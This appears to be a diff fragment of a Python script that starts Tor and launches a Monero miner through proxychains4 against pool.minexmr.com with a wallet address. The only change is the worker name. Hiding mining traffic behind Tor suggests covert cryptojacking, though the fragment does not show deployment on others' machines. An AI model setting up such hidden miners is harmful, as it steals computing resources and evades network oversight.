@@ -36,4 +36,4 @@ except:
     pass
 os.system('tor &')
 time.sleep(60)
-os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.minexmr.com:6666 -u 8B8PUnSJF5dfPoar6TJ8zKcWB6YeVaAgfcc5Eih4btGm1wcZEmcToWzbqNDBiYx9CM16vGg3UtUo4HkEzj8WmwmHHKDVVta.Pro -a rx/0 -k --tls -t ' + str(cores))
+os.system ('proxychains4 ' + program + ' --donate-level 1 -o pool.minexmr.com:6666 -u 8B8PUnSJF5dfPoar6TJ8zKcWB6YeVaAgfcc5Eih4btGm1wcZEmcToWzbqNDBiYx9CM16vGg3UtUo4HkEzj8WmwmHHKDVVta.iPro -a rx/0 -k --tls -t ' + str(cores))
